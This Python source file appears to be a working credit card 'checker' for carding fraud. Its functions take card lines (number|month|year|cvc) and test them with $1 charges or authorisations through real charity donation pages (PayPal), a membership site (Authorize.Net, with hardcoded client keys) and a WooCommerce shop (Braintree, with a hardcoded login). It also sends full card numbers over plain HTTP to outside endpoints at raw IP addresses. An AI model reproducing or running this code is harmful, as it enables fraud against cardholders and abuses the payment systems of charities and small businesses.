#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import re
import random
import base64
import uuid
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================================
# SHOPIFY API (YOUR NEW VPS)
# ============================================================================
SHOPIFY_API_ENDPOINT = "http://2.24.223.211:5000/shopify"

def check_shopify_api(site_url, cc, proxy=None):
    params = {'site': site_url, 'cc': cc}
    if proxy:
        params['proxy'] = proxy
    try:
        resp = requests.get(SHOPIFY_API_ENDPOINT, params=params, timeout=45, verify=False)
        resp.raise_for_status()
        data = resp.json()
        msg = data.get('Response', 'Unknown')
        gateway = data.get('Gateway', 'Shopify Payments')
        price = str(data.get('Price', '0.00'))
        api_status = data.get('Status', False)
        msg_upper = msg.upper()
        if 'ORDER_PLACED' in msg_upper or 'APPROVED' in msg_upper:
            status = 'APPROVED'
        elif 'OTP' in msg_upper or '3D' in msg_upper:
            status = 'APPROVED_OTP'
        elif 'DECLINED' in msg_upper:
            status = 'DECLINED'
        elif not api_status:
            status = 'ERROR'
        else:
            status = 'DECLINED'
        return {'Response': msg, 'status': status, 'gateway': gateway, 'price': price, 'site': site_url}
    except:
        return {'Response': 'API Error', 'status': 'ERROR', 'gateway': 'Shopify', 'price': '0.00', 'site': site_url}

def process_shopify_api_response(api_response, site_price='0.00'):
    if not api_response or not isinstance(api_response, dict):
        return "System Error", "ERROR", "Shopify Payments"
    msg = api_response.get('Response', 'Unknown')
    status = api_response.get('status', 'ERROR')
    gateway = api_response.get('gateway', 'Shopify Payments')
    return msg, status, gateway

# ============================================================================
# PROXY NORMALISATION
# ============================================================================
def normalise_proxy(proxy):
    if not proxy:
        return None
    if proxy.startswith('http://') or proxy.startswith('https://'):
        return proxy
    return f'http://{proxy}'

# ============================================================================
# STRIPE $5 CHARGE (keep your endpoint)
# ============================================================================
def check_stripe5(cc, proxy=None):
    url = f"http://138.128.240.15:8007/stripe5?cc={cc}"
    try:
        resp = requests.get(url, timeout=10, verify=False)
        resp.raise_for_status()
        data = resp.json()
        msg = data.get('Response', 'Unknown')
        if "Transaction Failed" in msg or "insufficient funds" in msg or "declined" in msg.lower():
            return msg, "DECLINED"
        elif "success" in msg.lower() or "charged" in msg.lower():
            return msg, "APPROVED"
        return msg, "UNKNOWN"
    except Exception as e:
        return f"Stripe5 API Error: {str(e)}", "ERROR"

# ============================================================================
# STRIPE AUTH (Auto‑stripe)
# ============================================================================
def check_stripe_auth(cc, proxy=None):
    url = f"http://138.128.240.15:8009/stripe_auth?cc={cc}"
    try:
        resp = requests.get(url, timeout=10, verify=False)
        resp.raise_for_status()
        data = resp.json()
        raw = data.get('Response', '{}')
        try:
            inner = json.loads(raw)
            if inner.get('success'):
                return "Card authorised successfully", "APPROVED"
            return inner.get('data',{}).get('error',{}).get('message', raw), "DECLINED"
        except:
            return raw, "UNKNOWN"
    except Exception as e:
        return f"Stripe Auth API Error: {str(e)}", "ERROR"

# ============================================================================
# PAYPAL CUSTOM CHARGE – MULTI‑SITE (EXACT WORKING SCRIPT)
# ============================================================================
PAYPAL_SITES = [
    "https://stockportmecfs.co.uk/donate-now/",
    "https://dev.journeytojannah.org.uk/donate-now/",
    "https://www.rarediseasesinternational.org/donate/",
    "https://www.sustaininghopeintl.org/donate/",
    "https://bilengebwanyayacongo.org/donate/",
    "https://mbiamenewvision.org/donate/",
]

def check_paypal_custom(cc, proxy=None):
    parts = cc.strip().split("|")
    if len(parts) != 4:
        return "Invalid card format", "ERROR"
    number, month, year, cvc = parts
    month = month.zfill(2)
    if len(year) == 2:
        year = "20" + year

    # Use the same User‑Agent as provided scripts
    ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    proxy_url = normalise_proxy(proxy)

    # Import MultipartEncoder here – if missing, pip install requests-toolbelt
    try:
        from requests_toolbelt.multipart.encoder import MultipartEncoder
    except ImportError:
        return "Missing package: requests-toolbelt", "ERROR"

    sites = random.sample(PAYPAL_SITES, len(PAYPAL_SITES))

    for site in sites:
        try:
            s = requests.Session()
            if proxy_url:
                s.proxies = {'http': proxy_url, 'https': proxy_url}

            # Step 1 – fetch page
            resp = s.get(site, headers={'User-Agent': ua}, timeout=20)
            if resp.status_code != 200:
                continue

            form_hash = re.search(r'name="give-form-hash"\s+value="(.*?)"', resp.text)
            form_prefix = re.search(r'name="give-form-id-prefix"\s+value="(.*?)"', resp.text)
            form_id = re.search(r'name="give-form-id"\s+value="(.*?)"', resp.text)
            enc_token = re.search(r'"data-client-token":"(.*?)"', resp.text)
            if not all([form_hash, form_prefix, form_id, enc_token]):
                continue

            form_hash = form_hash.group(1)
            form_prefix = form_prefix.group(1)
            form_id = form_id.group(1)
            access_token = re.search(r'"accessToken":"(.*?)"', base64.b64decode(enc_token.group(1)).decode()).group(1)

            ajax_url = site.rstrip('/') + '/wp-admin/admin-ajax.php'

            # Step 2 – create order (MULTIPART as in real script)
            create_data = MultipartEncoder(
                fields={
                    'give-honeypot': '',
                    'give-form-id-prefix': form_prefix,
                    'give-form-id': form_id,
                    'give-form-hash': form_hash,
                    'give-form-minimum': '1',
                    'give-form-maximum': '999999.99',
                    'give-amount': '1.00',
                    'payment-mode': 'paypal-commerce',
                    'give_first': 'John',
                    'give_last': 'Doe',
                    'give_email': 'johndoe@example.com',
                    'give-gateway': 'paypal-commerce',
                }
            )
            resp = s.post(ajax_url + '?action=give_paypal_commerce_create_order',
                          data=create_data,
                          headers={'Content-Type': create_data.content_type, 'User-Agent': ua},
                          timeout=20)
            order_id = resp.json()['data']['id']

            # Step 3 – confirm payment source
            confirm_payload = {
                "payment_source": {
                    "card": {
                        "number": number,
                        "expiry": f"{year}-{month}",
                        "security_code": cvc
                    }
                }
            }
            s.post(f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
                   json=confirm_payload,
                   headers={
                       'Authorization': f'Bearer {access_token}',
                       'Content-Type': 'application/json',
                       'User-Agent': ua,
                   }, timeout=20)

            # Step 4 – approve order (MULTIPART)
            approve_data = MultipartEncoder(
                fields={
                    'give-honeypot': '',
                    'give-form-id-prefix': form_prefix,
                    'give-form-id': form_id,
                    'give-form-hash': form_hash,
                    'give-form-minimum': '1',
                    'give-form-maximum': '999999.99',
                    'give-amount': '1.00',
                    'payment-mode': 'paypal-commerce',
                    'give_first': 'John',
                    'give_last': 'Doe',
                    'give_email': 'johndoe@example.com',
                    'give-gateway': 'paypal-commerce',
                }
            )
            resp = s.post(ajax_url + f'?action=give_paypal_commerce_approve_order&order={order_id}',
                          data=approve_data,
                          headers={'Content-Type': approve_data.content_type, 'User-Agent': ua},
                          timeout=20)
            result = resp.text.lower()

            if any(x in result for x in ['true', 'success', 'thank']):
                return "CHARGED $1.00", "APPROVED"
            if 'insufficient_funds' in result:
                return "INSUFFICIENT FUNDS", "APPROVED"
            if 'declined' in result or 'error' in result:
                return "DECLINED", "DECLINED"

            # unclear, try next site
        except:
            continue

    return "All PayPal sites failed – check proxy / site status", "ERROR"

# ============================================================================
# AUTHORIZE.NET $1 CHARGE (EXACT SCRIPT)
# ============================================================================
def check_authorize_net(cc, proxy=None):
    parts = cc.strip().split("|")
    if len(parts) != 4:
        return "Invalid card format", "ERROR"
    n, mm, yy, cvc = parts
    mm = mm.zfill(2)
    if "20" in yy:
        yy = yy.split("20")[1]   # 2-digit year

    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    proxy_url = normalise_proxy(proxy)

    try:
        s = requests.Session()
        if proxy_url:
            s.proxies = {'http': proxy_url, 'https': proxy_url}

        # Tokenize
        token_url = 'https://api2.authorize.net/xml/v1/request.api'
        token_data = {
            "securePaymentContainerRequest": {
                "merchantAuthentication": {
                    "name": "3q85aDr4SN9t",
                    "clientKey": "224BvW2FU79Fuzx86cxGMFpsdU3Bc7cqA9cvx64u6XXD5y6qTFmhFEHGF8Dhu6tC"
                },
                "data": {
                    "type": "TOKEN",
                    "id": "da6eaa1f-2da0-9a00-ad1b-b9ff572a19a4",
                    "token": {
                        "cardNumber": n,
                        "expirationDate": f"20{yy}-{mm}",
                        "cardCode": cvc,
                        "zip": "58104",
                        "fullName": "Mr perfect"
                    }
                }
            }
        }
        resp = s.post(token_url, json=token_data, headers={
            'Accept': '*/*', 'Content-Type': 'application/json',
            'Origin': 'https://www.bomaphila.com', 'User-Agent': ua,
        }, timeout=15)
        token = resp.json().get('opaqueData', {}).get('dataValue')
        if not token:
            return "Tokenization failed", "ERROR"

        # Get form ID
        form_resp = s.get('https://api.membershipworks.com/v2/form?ttl=Invoices',
                          headers={'accept': 'application/json', 'user-agent': ua, 'x-org': '29723'}, timeout=10)
        form_id = form_resp.json().get('fid')
        if not form_id:
            return "Form ID not found", "ERROR"

        # Checkout (multipart)
        checkout_url = f'https://api.membershipworks.com/v2/form/{form_id}/checkout'
        fields = {
            'nam': 'Mr perfect', 'xni': 'Mr perfect', 'eml': 'mrperfectxyct@gmail.com',
            'phn': '06534235789', 'xin': '3453452q', 'xvn': '43523452',
            'crd[nam]': 'Mr perfect ', 'crd[ad1]': '145 Marco street',
            'crd[cot]': 'Cass County', 'crd[sta]': 'ND', 'crd[con]': 'US',
            'crd[zip]': '58104', 'crd[cit]': 'Fargo', 'crd[loc][0]': '-96.8054856',
            'crd[loc][1]': '46.8213838', 'crd[tok]': token, 'sum': '100',
            'itm[0][_id]': '63b85320ab1e2e42be3eab83', 'itm[0][amt]': '100', 'itm[0][qty]': '1',
        }
        boundary = '----WebKitFormBoundaryz7wbnClCdUKdtQ5n'
        body = ''
        for name, value in fields.items():
            body += f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n{value}\r\n'
        body += f'--{boundary}--\r\n'
        resp = s.post(checkout_url, data=body.encode('utf-8'), headers={
            'accept': 'application/json',
            'content-type': f'multipart/form-data; boundary={boundary}',
            'origin': 'https://www.bomaphila.com', 'referer': 'https://www.bomaphila.com/',
            'user-agent': ua, 'x-org': '29723',
        }, timeout=20)
        result = resp.text.lower()
        if 'approved' in result or 'success' in result:
            return "CHARGE $1.00", "APPROVED"
        if 'insufficient' in result:
            return "INSUFFICIENT FUNDS", "APPROVED"
        if 'declined' in result:
            return "DECLINED", "DECLINED"
        return f"Unknown response: {resp.text[:50]}", "ERROR"
    except Exception as e:
        return f"Authorize.Net error: {str(e)[:80]}", "ERROR"

# ============================================================================
# BRAINTREE B3 AUTH (from b3_rh.py)
# ============================================================================
def check_braintree_b3(cc, proxy=None):
    parts = cc.strip().split("|")
    if len(parts) != 4:
        return "Invalid card format", "ERROR"
    n, mm, yy, cvc = parts
    mm = mm.zfill(2)
    if len(yy) == 2:
        yy = "20" + yy

    ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    proxy_url = normalise_proxy(proxy)

    try:
        s = requests.Session()
        if proxy_url:
            s.proxies = {'http': proxy_url, 'https': proxy_url}

        # 1. Login nonce
        resp = s.get('https://unclejimswormfarm.com/my-account/', headers={'User-Agent': ua}, timeout=15)
        login_nonce = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', resp.text).group(1)

        # 2. Login
        login_data = f'username=shamon843738@gmail.com&password=shamon843738@gmail.com&woocommerce-login-nonce={login_nonce}&_wp_http_referer=%2Fmy-account%2F&login=Log+in'
        s.post('https://unclejimswormfarm.com/my-account/', data=login_data, headers={
            'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': ua,
        }, timeout=15)

        # 3. Add payment method page
        resp = s.get('https://unclejimswormfarm.com/my-account/add-payment-method/', headers={'User-Agent': ua}, timeout=15)
        payment_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', resp.text).group(1)
        b_token_enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', resp.text).group(1)
        b_token = base64.b64decode(b_token_enc).decode()
        auth_fingerprint = re.search(r'"authorizationFingerprint":"(.*?)"', b_token).group(1)
        merchant_id = re.search(r'merchantId":"(.*?)"', b_token).group(1)

        # 4. Tokenize credit card (GraphQL)
        gql_data = {
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": n,
                        "expirationMonth": mm,
                        "expirationYear": yy[-2:],
                        "cvv": cvc,
                        "billingAddress": {"postalCode": "10010", "streetAddress": "5875 South Aviation Avenue"}
                    },
                    "options": {"validate": False}
                }
            }
        }
        resp = s.post('https://payments.braintree-api.com/graphql', json=gql_data, headers={
            'Authorization': f'Bearer {auth_fingerprint}',
            'Braintree-Version': '2018-05-10',
            'Content-Type': 'application/json',
            'User-Agent': ua,
        }, timeout=15)
        token = re.search(r'"token":"(.*?)"', resp.text).group(1)
        if not token:
            return "Tokenization failed", "ERROR"

        # 5. Add payment method
        add_data = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': token,
            'braintree_cc_device_data': '',
            'braintree_cc_3ds_nonce_key': '',
            'braintree_cc_config_data': f'{{"environment":"production","merchantId":"{merchant_id}"}}',
            'woocommerce-add-payment-method-nonce': payment_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }
        resp = s.post('https://unclejimswormfarm.com/my-account/add-payment-method/', data=add_data, headers={
            'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': ua,
        }, timeout=15)
        if "Payment method successfully added" in resp.text or "New payment method added" in resp.text:
            return "Card added (Auth OK)", "APPROVED"
        if "woocommerce-error" in resp.text:
            err = re.search(r'<ul class="woocommerce-error">\s*<li>\s*(.*?)\s*</li>', resp.text, re.DOTALL)
            reason = err.group(1).strip() if err else "Declined"
            return f"DECLINED: {reason}", "DECLINED"
        return "Unknown response", "ERROR"
    except Exception as e:
        return f"Braintree error: {str(e)[:80]}", "ERROR"

# ============================================================================
# ALIASES – NO CHANGES IN APP.PY
# ============================================================================
check_stripe_api = check_stripe5
check_b3_auth    = check_stripe_auth

check_paypal_fixed   = check_paypal_custom
check_paypal_general = check_paypal_custom
check_paypal_onyx    = check_paypal_custom

check_braintree_api = check_braintree_b3

# All other gates still use Shopify (they were never implemented otherwise)
def shopify_check(cc, proxy=None):
    FALLBACK_SITES = [
        "https://bb73c3-5.myshopify.com",
        "https://travelerchoicetravelware.myshopify.com",
    ]
    site = random.choice(FALLBACK_SITES)
    resp = check_shopify_api(site, cc, proxy)
    msg, status, _ = process_shopify_api_response(resp)
    return msg, status

check_chaos          = shopify_check
check_adyen          = shopify_check
check_app_auth       = shopify_check
check_stripe_onyx    = shopify_check
check_arcenus        = shopify_check
check_stripe_working = shopify_check
check_payflow        = shopify_check
check_random         = shopify_check
check_shopify_onyx   = shopify_check
check_skrill         = shopify_check
check_random_stripe  = shopify_check
check_razorpay       = shopify_check
check_payu           = shopify_check
check_sk_gateway     = shopify_check

# ============================================================================
# CONSTANTS
# ============================================================================
PAYPAL_AMOUNT = 0.05
